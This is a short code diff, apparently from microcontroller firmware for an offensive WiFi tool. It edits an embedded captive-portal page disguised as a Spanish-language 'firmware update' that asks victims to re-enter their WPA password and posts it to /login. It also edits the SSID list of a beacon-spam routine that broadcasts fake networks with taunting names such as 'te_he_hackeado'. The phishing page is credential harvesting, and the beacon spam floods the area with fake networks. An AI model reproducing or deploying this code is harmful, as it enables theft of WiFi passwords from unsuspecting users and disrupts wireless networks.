@@ -91,7 +91,7 @@ const char* captive_html PROGMEM = R"raw(
 </style>
 </head><body>
 <div class="box">
-  <h2>Actualización de Firmware</h2>
+  <h2>Actualizacion de Firmware</h2>
   <p>Verifique credenciales de red WiFi</p>
   <form action="/login" method="POST">
     <input type="password" name="pass" placeholder="Clave WPA" required>
@@ -136,14 +136,14 @@ namespace BeaconSpamTool {
     unsigned long last_spam = 0;
     
     const String spam_list[] = {
-        "RootedCon_2026",
-        "Connecting...",
-        "Free_WiFi_Fibra",
+        "te_he_hackeado",
+        "Hell_WiFi",
         "Error_404_Network_Not_Found",
         "FBI_Surveillance_Van",
         "Never_gonna_give_you_up",
         "Never_gonna_let_you_down",
-        "Obtaining_IP_Address..."
+        "tengo_tu_ip",
+        "ALBANIAN_VIRUS"
     };
     const int num_ssids = 8;
     
